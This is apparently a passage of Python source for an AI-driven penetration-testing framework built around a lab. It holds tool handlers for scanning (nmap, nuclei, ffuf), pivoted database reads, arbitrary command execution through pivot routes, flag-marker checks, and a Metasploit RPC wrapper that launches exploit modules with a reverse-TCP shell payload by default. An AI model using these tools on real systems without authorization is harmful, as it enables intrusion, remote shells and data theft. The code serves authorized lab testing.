    )
    return {"success": completed.returncode == 0, "stdout": completed.stdout or "", "stderr": completed.stderr or ""}


def _controlled_data_read_proof(arguments: dict[str, Any]) -> dict[str, Any]:
    host = _required(arguments, "host")
    port = _int(arguments.get("port"), 0)
    route_id = _required(arguments, "route_id")
    database = _string(arguments.get("database")) or "postgres"
    username = _string(arguments.get("username")) or "postgres"
    timeout = _int(arguments.get("timeout_seconds"), 30)
    if not _pivot_transport_available():
        return _payload(
            success=False,
            stderr="pivot transport unavailable",
            exit_code="pivot_unavailable",
            parsed={"runtime_hints": {"controlled_data_read": False}},
        )
    query = "SELECT current_database(), current_user, version();"
    result = _run_psql_query_via_configured_pivot(
        route_id=route_id,
        host=host,
        port=port,
        database=database,
        username=username,
        password=arguments.get("password"),
        query=query,
        timeout=timeout,
        pivot_username=_string(arguments.get("pivot_username")),
        pivot_password=_string(arguments.get("pivot_password")),
    )
    stdout = _string(result.get("stdout")) or ""
    rows = [line for line in stdout.splitlines() if line.strip()]
    row_count = len(rows)
    digest = hashlib.sha256(stdout.encode("utf-8")).hexdigest() if stdout else ""
    success = bool(result.get("success")) and row_count > 0
    parsed = _default_parsed()
    parsed["evidence"].append(
        {
            "evidence_id": f"controlled-data::{route_id}::{host}:{port}",
            "kind": "controlled_data_read_proof",
            "host": host,
            "port": port,
            "via_pivot_route": route_id,
            "row_count": row_count,
            "row_digest_sha256": digest,
        }
    )
    parsed["runtime_hints"] = {"controlled_data_read": success, "via_pivot_route": route_id}
    parsed["writeback_hints"] = {"observation_category": "controlled_data_read_proof"}
    summary = f"read {row_count} row(s) from {host}:{port} via {route_id}; sha256={digest[:12]}"
    return _payload(success=success, stdout=summary, stderr=_string(result.get("stderr")) or "", exit_code=0 if success else "read_failed", parsed=parsed)


def _pivot_exec(arguments: dict[str, Any]) -> dict[str, Any]:
    """Generic pivot egress: run an arbitrary argv through a configured route.

    The freeform Step 5 transport primitive that the bespoke pivoted_* tools
    collapse into. A successful run is causal proof the route is live, so the
    fact extractor records the route as an active PivotRoute (see
    ``_extract_pivot_route`` wired to ``pivot_exec``).
    """

    route_id = _required(arguments, "route_id")
    raw_argv = arguments.get("argv")
    if isinstance(raw_argv, str):
        argv = shlex.split(raw_argv)
    else:
        argv = _string_items(raw_argv)
    if not argv:
        raise ValueError("argv is required")
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_COMMAND_TIMEOUT_SECONDS)
    completed = _run_via_configured_pivot(
        route_id=route_id,
        argv=argv,
        timeout=timeout,
        username=_string(arguments.get("pivot_username")),
        password=_string(arguments.get("pivot_password")),
    )
    stdout = completed.stdout or ""
    success = completed.returncode == 0
    parsed = _default_parsed()
    # route_id in parsed lets _extract_pivot_route record the confirmed route.
    parsed["route_id"] = route_id
    parsed["runtime_hints"] = {"via_pivot_route": route_id, "pivot_exec": success}
    parsed["evidence"].append(
        {
            "evidence_id": f"pivot-exec::{route_id}::{_safe_artifact_name(' '.join(argv))}",
            "kind": "pivot_exec",
            "via_pivot_route": route_id,
            "argv": argv,
            "exit_code": completed.returncode,
        }
    )
    parsed["writeback_hints"] = {"observation_category": "pivot_exec"}
    return _payload(
        success=success,
        stdout=stdout,
        stderr=completed.stderr or "",
        exit_code=0 if success else "pivot_exec_failed",
        parsed=parsed,
    )


def _goal_check(arguments: dict[str, Any]) -> dict[str, Any]:
    url = _required(arguments, "url")
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    expected_status = arguments.get("expected_status")
    body_contains = arguments.get("body_contains")
    response = _open_url(url, method="GET", timeout=timeout)
    checks: list[dict[str, Any]] = []
    if expected_status is not None:
        checks.append(
            {
                "type": "status",
                "expected": int(expected_status),
                "actual": response["status"],
                "passed": int(response["status"]) == int(expected_status),
            }
        )
    if body_contains is not None:
        needle = str(body_contains)
        checks.append({"type": "body_contains", "expected": needle, "passed": needle in response["body_excerpt"]})
    hidden_marker_check = _hidden_marker_check(arguments, response)
    if hidden_marker_check is not None:
        checks.append(hidden_marker_check)
    passed = all(item["passed"] for item in checks) if checks else int(response["status"]) < 400
    parsed = _parsed_http(url=url, response=response)
    finding = {"kind": "GoalCheck", "url": url, "goal_satisfied": passed, "checks": checks, "evidence_refs": []}
    parsed["findings"].append(finding)
    parsed["evidence"].append({"kind": "goal verification evidence", "url": url, "goal_satisfied": passed})
    parsed["runtime_hints"] = {"goal_satisfied": passed, "goal_summary": "goal check passed" if passed else "goal check did not pass", "goal_evidence_refs": []}
    parsed["writeback_hints"] = {"observation_category": "goal_check", "url": url, "goal_satisfied": passed}
    return _payload(
        success=passed,
        stdout=json.dumps(finding, ensure_ascii=True, sort_keys=True),
        exit_code=0 if passed else "goal_not_satisfied",
        parsed=parsed,
    )


def _artifact_store(arguments: dict[str, Any]) -> dict[str, Any]:
    name = _safe_artifact_name(str(arguments.get("name") or "artifact"))
    content_type = str(arguments.get("content_type") or "text/plain")
    if isinstance(arguments.get("json_content"), dict):
        suffix = ".json"
        content = json.dumps(arguments["json_content"], ensure_ascii=True, indent=2, sort_keys=True)
        content_type = "application/json"
    else:
        suffix = ".txt"
        content = str(arguments.get("content", ""))
    if len(content) > MAX_OUTPUT_CHARS:
        return _payload(success=False, stderr="artifact content exceeds max size", exit_code="artifact_too_large")
    artifact_dir = Path(os.getenv("AEGRA_MCP_ARTIFACT_DIR", "var/mcp_artifacts")).resolve()
    artifact_dir.mkdir(parents=True, exist_ok=True)
    path = artifact_dir / f"{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}-{name}{suffix}"
    path.write_text(content, encoding="utf-8")
    artifact = {"type": "file", "path": str(path), "content_type": content_type, "bytes": len(content.encode("utf-8"))}
    parsed = _default_parsed()
    parsed["writeback_hints"] = {"observation_category": "evidence_artifact", "artifact_path": str(path)}
    return _payload(success=True, stdout=json.dumps(artifact, ensure_ascii=True, sort_keys=True), artifacts=[artifact], parsed=parsed)


def _nuclei_scan(arguments: dict[str, Any]) -> dict[str, Any]:
    binary = _require_binary("nuclei")
    if binary is None:
        return _tool_unavailable("nuclei_scan", "nuclei")
    url = _required(arguments, "url")
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    argv = [binary, "-u", url, "-jsonl", "-silent", "-no-color"]
    severities = _string_items(arguments.get("severity")) or ["low", "medium", "high", "critical"]
    argv.extend(["-severity", ",".join(severities)])
    rate_limit = _int(arguments.get("rate_limit"), 20)
    argv.extend(["-rl", str(rate_limit)])
    for template in _string_items(arguments.get("templates")):
        argv.extend(["-t", template])
    result = _run_command(_command_args_from_tool(arguments, argv=argv, timeout_seconds=timeout, max_output_chars=MAX_OUTPUT_CHARS))
    parsed = _parse_nuclei_jsonl(url, result.get("stdout", ""))
    result["parsed"] = parsed
    return result


def _whatweb_fingerprint(arguments: dict[str, Any]) -> dict[str, Any]:
    binary = _require_binary("whatweb")
    if binary is None:
        return _tool_unavailable("whatweb_fingerprint", "whatweb")
    url = _required(arguments, "url")
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    result = _run_command(
        _command_args_from_tool(
            arguments,
            argv=[binary, "--no-errors", "--log-json=-", url],
            timeout_seconds=timeout,
        )
    )
    parsed = _parse_whatweb_json(url, result.get("stdout", ""))
    result["parsed"] = parsed
    return result


def _ffuf_discover(arguments: dict[str, Any]) -> dict[str, Any]:
    binary = _require_binary("ffuf")
    if binary is None:
        return _tool_unavailable("ffuf_discover", "ffuf")
    base_url = str(arguments.get("base_url") or arguments.get("url") or "").rstrip("/")
    if not base_url:
        raise ValueError("ffuf_discover requires base_url or url")
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    wordlist = str(arguments.get("wordlist") or "").strip()
    temp_wordlist: Path | None = None
    if not wordlist:
        words = _string_items(arguments.get("words")) or DEFAULT_FFUF_WORDS
        temp_wordlist = _artifact_temp_path("ffuf-words", ".txt")
        temp_wordlist.write_text("\n".join(words) + "\n", encoding="utf-8")
        wordlist = str(temp_wordlist)
    match_status = ",".join(str(item) for item in (arguments.get("match_status") or [200, 204, 301, 302, 307, 401, 403]))
    argv = [binary, "-u", f"{base_url}/FUZZ", "-w", wordlist, "-mc", match_status, "-of", "json"]
    result = _run_command(_command_args_from_tool(arguments, argv=argv, timeout_seconds=timeout, max_output_chars=MAX_OUTPUT_CHARS))
    parsed = _parse_ffuf_json(base_url, result.get("stdout", ""))
    result["parsed"] = parsed
    if temp_wordlist is not None:
        try:
            temp_wordlist.unlink()
        except OSError:
            pass
    return result


_EXPLOIT_PROFILE_CACHE: dict[str, dict[str, Any]] = {}
_SAFE_OUTPUT_PREFIX = "/opt/aegra/"
_SAFE_OBSERVE_ZONES = {"flags", "hints", "loot"}


def _post_access_observe(arguments: dict[str, Any]) -> dict[str, Any]:
    zone = (_string(arguments.get("zone")) or "hints").lower()
    if zone not in _SAFE_OBSERVE_ZONES:
        return _payload(
            success=False,
            stderr=f"zone must be one of {sorted(_SAFE_OBSERVE_ZONES)}, got: {zone}",
            exit_code="invalid_zone",
            parsed={"runtime_hints": {"blocked_by": "invalid_zone"}},
        )

    base_path = Path(_SAFE_OUTPUT_PREFIX) / zone
    parsed = _default_parsed()
    artifacts_found: list[dict[str, Any]] = []

    if not base_path.exists():
        parsed["runtime_hints"] = {"zone": zone, "files_found": 0, "zone_exists": False}
        return _payload(success=True, stdout=json.dumps({"zone": zone, "files": []}, sort_keys=True), parsed=parsed)

    for entry in sorted(base_path.iterdir()):
        if not entry.is_file():
            continue
        try:
            raw = entry.read_bytes()
        except OSError:
            continue
        # For flags zone, only return SHA-256 hash (never the raw content)
        content_hash = hashlib.sha256(raw).hexdigest()
        item: dict[str, Any] = {
            "type": "PostAccessObservation",
            "zone": zone,
            "filename": entry.name,
            "size_bytes": len(raw),
            "content_sha256": content_hash,
        }
        if zone != "flags":
            # Hints and loot: return decoded text if it looks safe (no newlines → single-value marker, redact)
            text = raw.decode("utf-8", errors="replace").strip()
            # Redact anything that looks like a raw flag/token (short single-line with no spaces)
            if "\n" not in text and len(text) <= 64 and " " not in text:
                item["content_type"] = "redacted_marker"
                item["content_hash"] = content_hash
            else:
                item["content"] = text[:512]
                item["content_type"] = "text"
        artifacts_found.append(item)
        parsed["entities"].append(item)
        parsed["evidence"].append({"kind": "post_access_observation", "zone": zone, "filename": entry.name, "content_sha256": content_hash})

    parsed["runtime_hints"] = {"zone": zone, "files_found": len(artifacts_found), "zone_exists": True}
    parsed["writeback_hints"] = {"observation_category": "post_access_observation", "zone": zone}
    return _payload(success=True, stdout=json.dumps({"zone": zone, "files": artifacts_found}, ensure_ascii=True, sort_keys=True), parsed=parsed)


def _read_lab_marker(arguments: dict[str, Any]) -> dict[str, Any]:
    marker_id = _required(arguments, "marker_id")
    goal_id = _string(arguments.get("goal_id")) or marker_id

    # First try hidden fixture (already implemented)
    marker_literal = _hidden_marker_literal(marker_id)

    # Fall back to /opt/aegra/flags/{marker_id}
    if marker_literal is None:
        candidate = Path(_SAFE_OUTPUT_PREFIX) / "flags" / _safe_artifact_name(marker_id)
        if candidate.exists():
            try:
                marker_literal = candidate.read_text(encoding="utf-8").strip()
            except OSError:
                marker_literal = None

    parsed = _default_parsed()
    if marker_literal is None:
        parsed["runtime_hints"] = {"marker_found": False, "marker_id": marker_id}
        return _payload(
            success=False,
            stderr=f"lab marker not found: {marker_id}",
            exit_code="marker_not_found",
            parsed=parsed,
        )

    # Compute HMAC submission hash — never return raw marker
    signing_key = os.environ.get("AEGRA_ORACLE_SIGNING_KEY", "aegra-default-dev-key")
    import hmac as _hmac
    payload_str = json.dumps({"goal_id": goal_id, "marker_id": marker_id}, sort_keys=True)
    submission_hash = _hmac.new(
        signing_key.encode("utf-8"),
        payload_str.encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()
    proof_token = f"proof:{goal_id}:{submission_hash[:16]}"

    evidence_id = f"marker-evidence::{marker_id}"
    parsed["entities"].append({
        "type": "GoalCheck",
        "goal_id": goal_id,
        "marker_id": marker_id,
        "marker_found": True,
    })
    parsed["evidence"].append({
        "kind": "goal verification evidence",
        "evidence_id": evidence_id,
        "marker_id": marker_id,
        "goal_id": goal_id,
        "proof_token": proof_token,
    })
    parsed["runtime_hints"] = {
        "goal_satisfied": True,
        "marker_found": True,
        "marker_id": marker_id,
        "goal_id": goal_id,
        "proof_token": proof_token,
        "evidence_refs": [evidence_id],
    }
    parsed["writeback_hints"] = {"observation_category": "goal_marker_check", "marker_id": marker_id}
    result = {"marker_found": True, "marker_id": marker_id, "proof_token": proof_token, "evidence_id": evidence_id}
    return _payload(success=True, stdout=json.dumps(result, sort_keys=True), parsed=parsed)


def _internal_goal_check(arguments: dict[str, Any]) -> dict[str, Any]:
    route_id = _string(arguments.get("route_id"))
    session_id = _string(arguments.get("session_id"))
    if route_id is None and session_id is None:
        return _payload(
            success=False,
            stderr="internal_goal_check requires route_id or session_id",
            exit_code="missing_route",
            parsed={"runtime_hints": {"blocked_by": "missing_route_or_session"}},
        )

    host = _required(arguments, "host")
    port = _int(arguments.get("port"), 80)
    protocol = (_string(arguments.get("protocol")) or "http").lower()
    path = str(arguments.get("path") or "/")
    if not path.startswith("/"):
        path = "/" + path
    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_TIMEOUT_SECONDS)
    url = f"{protocol}://{host}:{port}{path}"

    try:
        response = _open_url(url, method="GET", timeout=timeout)
    except Exception as exc:
        parsed = _default_parsed()
        parsed["runtime_hints"] = {
            "goal_satisfied": False,
            "goal_summary": f"internal probe failed: {exc!s:.120}",
            "route_id": route_id,
            "session_id": session_id,
        }
        return _payload(success=False, stderr=str(exc), exit_code="probe_failed", parsed=parsed)

    checks: list[dict[str, Any]] = []
    expected_status = arguments.get("expected_status")
    body_contains = arguments.get("body_contains")
    if expected_status is not None:
        checks.append({
            "type": "status",
            "expected": int(expected_status),
            "actual": response["status"],
            "passed": int(response["status"]) == int(expected_status),
        })
    if body_contains is not None:
        needle = str(body_contains)
        checks.append({"type": "body_contains", "expected": needle, "passed": needle in response["body_excerpt"]})
    hidden_check = _hidden_marker_check(arguments, response)
    if hidden_check is not None:
        checks.append(hidden_check)
    passed = all(item["passed"] for item in checks) if checks else int(response["status"]) < 400

    evidence_id = f"internal-goal-evidence::{route_id or session_id}::{host}:{port}"
    parsed = _parsed_http(url=url, response=response)
    finding = {
        "kind": "GoalCheck",
        "url": url,
        "host": host,
        "port": port,
        "route_id": route_id,
        "goal_satisfied": passed,
        "checks": checks,
        "evidence_refs": [evidence_id],
    }
    parsed["findings"].append(finding)
    parsed["evidence"].append({
        "kind": "goal verification evidence",
        "evidence_id": evidence_id,
        "url": url,
        "goal_satisfied": passed,
        "route_id": route_id,
        "session_id": session_id,
    })
    parsed["runtime_hints"] = {
        "goal_satisfied": passed,
        "goal_summary": "internal goal check passed" if passed else "internal goal check did not pass",
        "goal_evidence_refs": [evidence_id],
        "route_id": route_id,
        "session_id": session_id,
    }
    parsed["writeback_hints"] = {"observation_category": "internal_goal_check", "url": url, "goal_satisfied": passed}
    return _payload(
        success=passed,
        stdout=json.dumps(finding, ensure_ascii=True, sort_keys=True),
        exit_code=0 if passed else "goal_not_satisfied",
        parsed=parsed,
    )


def _success_condition_check(arguments: dict[str, Any]) -> dict[str, Any]:
    operation_id = _string(arguments.get("operation_id") or os.getenv("AEGRA_OPERATION_ID"))
    progress: dict[str, Any] = {}

    if operation_id:
        metadata_path = resolve_runtime_store_root() / operation_id / "metadata.json"
        if metadata_path.exists():
            try:
                raw = json.loads(metadata_path.read_text(encoding="utf-8"))
                progress = raw.get("success_condition_progress") or {}
            except (OSError, json.JSONDecodeError):
                progress = {}

    # Return only the redacted fields — never private_success_rubric, raw tokens, or proof values
    redacted: dict[str, Any] = {
        "eligible_for_stop": bool(progress.get("eligible_for_stop", False)),
        "satisfied": list(progress.get("satisfied") or []),
        "missing": list(progress.get("missing") or []),
        "chain_integrity": progress.get("chain_integrity"),
        "goal_proof_valid": progress.get("goal_proof_valid"),
    }
    parsed = _default_parsed()
    parsed["runtime_hints"] = {
        "success_condition_progress": redacted,
        "eligible_for_stop": redacted["eligible_for_stop"],
    }
    parsed["writeback_hints"] = {"observation_category": "success_condition_check"}
    return _payload(success=True, stdout=json.dumps(redacted, sort_keys=True), parsed=parsed)


def _parse_nmap_output(target: str, stdout: str) -> dict[str, Any]:
    parsed = _default_parsed()
    parsed["writeback_hints"] = {"observation_category": "service_discovery", "target": target}
    current_host = target
    host_ids: set[str] = set()

    def ensure_host(address: str) -> str:
        host_id = f"host::{address}"
        if host_id not in host_ids:
            parsed["entities"].append({"type": "Host", "id": host_id, "address": address, "confidence": 0.9})
            host_ids.add(host_id)
        return host_id

    ensure_host(target)
    for line in stdout.splitlines():
        host_match = re.search(r"^Nmap scan report for\s+(?P<host>.+?)\s*$", line)
        if host_match:
            current_host = _normalize_nmap_host(host_match.group("host")) or target
            ensure_host(current_host)
            continue
        match = re.search(r"(?P<port>\d+)/(?P<protocol>tcp|udp)\s+open\s+(?P<service>\S+)(?:\s+(?P<banner>.*))?", line)
        if not match:
            continue
        banner = (match.group("banner") or "").strip()
        product = banner.split()[0] if banner else ""
        version = banner.split()[1] if len(banner.split()) > 1 else ""
        host_id = ensure_host(current_host)
        service_id = f"service::{current_host}:{match.group('port')}/{match.group('protocol')}"
        entity = {
            "type": "Service",
            "id": service_id,
            "host": current_host,
            "port": int(match.group("port")),
            "protocol": match.group("protocol"),
            "service": match.group("service"),
            "product": product,
            "version": version,
            "banner": banner,
            "state": "open",
            "confidence": 0.85,
        }
        parsed["entities"].append(entity)
        parsed["relations"].append({"type": "HOSTS_SERVICE", "source_ref": {"graph": "kg", "ref_id": host_id, "ref_type": "Host"}, "target_ref": {"graph": "kg", "ref_id": service_id, "ref_type": "Service"}})
        parsed["evidence"].append({"kind": "scan evidence", "summary": line, "target": current_host, "confidence": 0.85})
    return parsed


def _normalize_nmap_host(value: str) -> str | None:
    text = str(value or "").strip()
    if not text:
        return None
    paren_match = re.search(r"\((?P<address>(?:\d{1,3}\.){3}\d{1,3}|[0-9a-fA-F:]+)\)", text)
    if paren_match:
        return paren_match.group("address")
    return text.split()[0] if text.split() else None


def _parsed_http(*, url: str, response: dict[str, Any]) -> dict[str, Any]:
    parsed = _default_parsed()
    body_excerpt = response.get("body_excerpt") or ""
    body_hash = hashlib.sha256(body_excerpt.encode("utf-8", errors="replace")).hexdigest()
    parsed["entities"].append(
        {
            "type": "WebEndpoint",
            "url": url,
            "status_code": response["status"],
            "title": _extract_title(body_excerpt),
            "server_header": response["headers"].get("server"),
            "content_type": response["headers"].get("content-type"),
            "body_excerpt_sha256": body_hash,
            "confidence": 0.8,
        }
    )
    parsed["evidence"].append({"kind": "http_probe", "url": url, "status_code": response["status"], "body_excerpt_sha256": body_hash})
    parsed["writeback_hints"] = {"observation_category": "http_probe", "url": url}
    return parsed


def _open_url(url: str, *, method: str, timeout: int, headers: dict[str, str] | None = None, data: bytes | None = None) -> dict[str, Any]:
    request = Request(url, method=method, headers=headers or {}, data=data)
    try:
        with urlopen(request, timeout=timeout) as response:
            body = response.read(4096).decode("utf-8", errors="replace")
            status = int(getattr(response, "status", 200))
            headers = {key.lower(): value for key, value in response.headers.items()}
    except HTTPError as exc:
        body = exc.read(4096).decode("utf-8", errors="replace")
        status = int(exc.code)
        headers = {key.lower(): value for key, value in exc.headers.items()}
    except URLError as exc:
        raise RuntimeError(str(exc.reason)) from exc
    return {"status": status, "headers": headers, "body_excerpt": body[:4096]}


def _tool_unavailable(tool_name: str, binary: str) -> dict[str, Any]:
    return _payload(
        success=False,
        stderr=f"{binary} is not installed or not on PATH",
        exit_code="tool_unavailable",
        parsed={"runtime_hints": {"blocked_by": "tool_unavailable", "tool": tool_name, "missing_binary": binary}},
    )


def _require_binary(name: str) -> str | None:
    return shutil.which(name)


def _parse_nuclei_jsonl(url: str, stdout: str) -> dict[str, Any]:
    parsed = _default_parsed()
    parsed["writeback_hints"] = {"observation_category": "vulnerability_validation", "url": url, "tool": "nuclei"}
    for line in stdout.splitlines():
        try:
            item = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(item, dict):
            continue
        info = item.get("info") if isinstance(item.get("info"), dict) else {}
        finding = {
            "kind": "nuclei_finding",
            "template_id": item.get("template-id") or item.get("template_id"),
            "name": info.get("name"),
            "severity": info.get("severity"),
            "matched_at": item.get("matched-at") or item.get("matched_at"),
            "host": item.get("host"),
        }
        parsed["findings"].append(finding)
    return parsed


def _parse_whatweb_json(url: str, stdout: str) -> dict[str, Any]:
    parsed = _default_parsed()
    parsed["writeback_hints"] = {"observation_category": "web_fingerprint", "url": url, "tool": "whatweb"}
    try:
        payload = json.loads(stdout)
    except json.JSONDecodeError:
        payload = []
    items = payload if isinstance(payload, list) else [payload]
    for item in items:
        if not isinstance(item, dict):
            continue
        plugins = item.get("plugins") if isinstance(item.get("plugins"), dict) else {}
        parsed["entities"].append({"type": "web_fingerprint", "url": item.get("target") or url, "plugins": sorted(plugins)})
    return parsed


def _parse_ffuf_json(base_url: str, stdout: str) -> dict[str, Any]:
    parsed = _default_parsed()
    parsed["writeback_hints"] = {"observation_category": "web_discovery", "base_url": base_url, "tool": "ffuf"}
    try:
        payload = json.loads(stdout)
    except json.JSONDecodeError:
        payload = {}
    results = payload.get("results") if isinstance(payload, dict) and isinstance(payload.get("results"), list) else []
    for item in results:
        if not isinstance(item, dict):
            continue
        entity = {
            "type": "web_path",
            "url": item.get("url"),
            "path": "/" + str(item.get("input", {}).get("FUZZ", "")).lstrip("/") if isinstance(item.get("input"), dict) else None,
            "status": item.get("status"),
            "length": item.get("length"),
        }
        parsed["entities"].append(entity)
    return parsed


def _url_from_arguments(arguments: dict[str, Any]) -> str:
    url = arguments.get("url")
    if url:
        return str(url)
    target = _required(arguments, "target")
    scheme = str(arguments.get("scheme", "http"))
    port = arguments.get("port")
    path = str(arguments.get("path", "/"))
    if not path.startswith("/"):
        path = "/" + path
    netloc = f"{target}:{port}" if port else str(target)
    return f"{scheme}://{netloc}{path}"


def _payload(
    *,
    success: bool,
    stdout: str = "",
    stderr: str = "",
    exit_code: int | str | None = None,
    parsed: dict[str, Any] | None = None,
    artifacts: list[dict[str, Any]] | None = None,
    metadata: dict[str, Any] | None = None,
) -> dict[str, Any]:
    return {
        "success": success,
        "stdout": stdout,
        "stderr": stderr,
        "exit_code": 0 if exit_code is None and success else exit_code,
        "parsed": _merge_parsed(parsed),
        "artifacts": artifacts or [],
        "metadata": metadata or {},
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }


def _decode_timeout_output(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return str(value)


def _write_raw_tool_output(*, arguments: dict[str, Any], payload: dict[str, Any]) -> str:
    operation_id = _string(arguments.get("operation_id") or os.getenv("AEGRA_OPERATION_ID"))
    trace_id = _string(arguments.get("trace_id")) or f"tool-{uuid.uuid4().hex}"
    store_root = resolve_runtime_store_root()
    if operation_id:
        output_dir = store_root / operation_id / "tool-outputs"
    else:
        output_dir = store_root / "_tool_outputs"
    output_dir.mkdir(parents=True, exist_ok=True)
    path = output_dir / f"{_safe_artifact_name(trace_id)}.json"
    path.write_text(json.dumps(payload, ensure_ascii=True, indent=2, sort_keys=True, default=str), encoding="utf-8")
    return str(path)


def _ensure_raw_output_ref(*, arguments: dict[str, Any], payload: dict[str, Any]) -> dict[str, Any]:
    metadata = payload.setdefault("metadata", {})
    if not isinstance(metadata, dict):
        metadata = {}
        payload["metadata"] = metadata
    existing_ref = _string(metadata.get("raw_output_ref") or payload.get("raw_output_ref"))
    if existing_ref:
        metadata["raw_output_ref"] = existing_ref
        payload["raw_output_ref"] = existing_ref
        parsed = payload.get("parsed")
        if isinstance(parsed, dict):
            hints = parsed.setdefault("writeback_hints", {})
            if isinstance(hints, dict):
                hints.setdefault("raw_output_ref", existing_ref)
        return payload
    if not _string(arguments.get("operation_id") or os.getenv("AEGRA_OPERATION_ID")):
        return payload
    raw_output_ref = _write_raw_tool_output(arguments=arguments, payload=payload)
    metadata["raw_output_ref"] = raw_output_ref
    payload["raw_output_ref"] = raw_output_ref
    parsed = payload.get("parsed")
    if isinstance(parsed, dict):
        hints = parsed.setdefault("writeback_hints", {})
        if isinstance(hints, dict):
            hints.setdefault("raw_output_ref", raw_output_ref)
    return payload


def _command_args_from_tool(
    arguments: dict[str, Any],
    *,
    argv: list[str],
    timeout_seconds: int,
    max_output_chars: int | None = None,
) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "argv": argv,
        "timeout_seconds": timeout_seconds,
        "operation_id": arguments.get("operation_id"),
        "trace_id": arguments.get("trace_id"),
    }
    if max_output_chars is not None:
        payload["max_output_chars"] = max_output_chars
    return payload


def _default_parsed() -> dict[str, Any]:
    return {
        "entities": [],
        "relations": [],
        "observations": [],
        "evidence": [],
        "findings": [],
        "runtime_hints": {},
        "writeback_hints": {},
    }


def _merge_parsed(parsed: dict[str, Any] | None) -> dict[str, Any]:
    merged = _default_parsed()
    if isinstance(parsed, dict):
        for key, value in parsed.items():
            merged[key] = value
    return merged


# ---------------------------------------------------------------------------
# Metasploit RPC engine (Step 5 / cg.md G.5 stage 1a: real exploit -> Session)
# ---------------------------------------------------------------------------
# The heavy msf framework runs in a dedicated msfrpcd sidecar (see
# lab/environments/full_chain_lab/docker-compose.msf.yml); this module is only a
# thin pymetasploit3 client. metasploit_exec runs an exploit module and, on
# success, the opened session_id flows through parsed.session_id ->
# ToolTraceFactExtractor._extract_session -> KG Session, satisfying success
# contract #7/#8 with a REAL session (the real-tool replacement for the canned
# lab_authorized_exploit_execute / ExploitCapability).


def _load_msf_config() -> dict[str, Any] | None:
    """Read msfrpcd connection config from runtime policy adapter_policy.metasploit."""

    path = _string(os.getenv("AEGRA_RUNTIME_POLICY_PATH"))
    if not path or not Path(path).exists():
        return None
    try:
        policy = json.loads(Path(path).read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None
    adapter_policy = policy.get("adapter_policy") if isinstance(policy, dict) else None
    msf = adapter_policy.get("metasploit") if isinstance(adapter_policy, dict) else None
    return dict(msf) if isinstance(msf, dict) else None


def _msf_available() -> bool:
    """msf tools are listable only when configured AND the client lib is importable."""

    if _load_msf_config() is None:
        return False
    try:
        import pymetasploit3  # noqa: F401
    except Exception:
        return False
    return True


def _msf_client(config: dict[str, Any]):
    """Connect to the configured msfrpcd. Isolated so tests can monkeypatch it."""

    from pymetasploit3.msfrpc import MsfRpcClient

    return MsfRpcClient(
        str(config.get("password") or ""),
        server=str(config.get("host") or "127.0.0.1"),
        port=int(config.get("port") or 55553),
        ssl=bool(config.get("ssl", False)),
        username=str(config.get("username") or "msf"),
    )


def _msf_host_from_target(target: str) -> str:
    text = str(target or "").strip()
    if "://" in text:
        return urlparse(text).hostname or text
    if ":" in text and re.match(r"^\d{1,3}(?:\.\d{1,3}){3}", text):
        return text.split(":", 1)[0]
    return text


def _msf_wait_for_session(client: Any, before: set[str], timeout: int) -> str | None:
    deadline = time.time() + max(timeout, 5)
    while time.time() < deadline:
        new = {str(k) for k in client.sessions.list.keys()} - before
        if new:
            return sorted(new)[0]
        time.sleep(3)
    return None


def _metasploit_exec(arguments: dict[str, Any]) -> dict[str, Any]:
    config = _load_msf_config()
    if config is None:
        return _payload(
            success=False,
            stderr="metasploit RPC is not configured (adapter_policy.metasploit)",
            exit_code="msf_not_configured",
            parsed={"runtime_hints": {"blocked_by": "msf_not_configured"}},
        )
    module_name = _string(arguments.get("module"))
    target = _string(arguments.get("target") or arguments.get("rhosts") or arguments.get("target_url"))
    if not module_name or not target:
        return _payload(success=False, stderr="module and target are required", exit_code="invalid_arguments")
    rhost = _msf_host_from_target(target)
    timeout = max(5, _int(arguments.get("timeout_seconds"), 90))
    wait_timeout = max(3, timeout - 5)
    try:
        client = _msf_client(config)
    except Exception as exc:  # noqa: BLE001 - surface any connection failure to the LLM
        return _payload(
            success=False,
            stderr=f"msfrpcd connection failed: {exc}",
            exit_code="msf_unreachable",
            parsed={"runtime_hints": {"blocked_by": "msf_unreachable"}},
        )
    try:
        mtype, mpath = module_name.split("/", 1) if "/" in module_name else ("exploit", module_name)
        exploit = client.modules.use(mtype, mpath)
        exploit["RHOSTS"] = rhost
        if arguments.get("rport"):
            exploit["RPORT"] = _int(arguments.get("rport"), 0)
        if arguments.get("target_uri"):
            exploit["TARGETURI"] = _string(arguments.get("target_uri"))
        options = arguments.get("options")
        if isinstance(options, dict):
            for key, value in options.items():
                exploit[str(key)] = value
        payload_name = _string(arguments.get("payload")) or "linux/x64/shell_reverse_tcp"
        payload = client.modules.use("payload", payload_name)
        lhost = _string(arguments.get("lhost")) or _string(config.get("lhost"))
        if lhost:
            payload["LHOST"] = lhost
        payload["LPORT"] = _int(arguments.get("lport"), 4444)
        before = {str(k) for k in client.sessions.list.keys()}
        exploit.execute(payload=payload)
        session_id = _msf_wait_for_session(client, before, wait_timeout)
    except Exception as exc:  # noqa: BLE001
        return _payload(success=False, stderr=f"metasploit_exec failed: {exc}", exit_code="msf_exec_error")
    if session_id is None:
        parsed = _default_parsed()
        parsed["runtime_hints"] = {
            "module": module_name,
            "target_ref": target,
            "bound_target": rhost,
            "exploit_executed": True,
            "session_opened": False,
            "wait_timeout_seconds": wait_timeout,
        }
        parsed["writeback_hints"] = {"observation_category": "exploit_attempt"}
        return _payload(
            success=True,
            stdout=json.dumps(
                {
                    "module": module_name,
                    "target": rhost,
                    "session_opened": False,
                    "result": "no_session",
                },
                ensure_ascii=True,
                sort_keys=True,
            ),
            stderr="exploit ran but no session opened within timeout",
            exit_code="no_session",
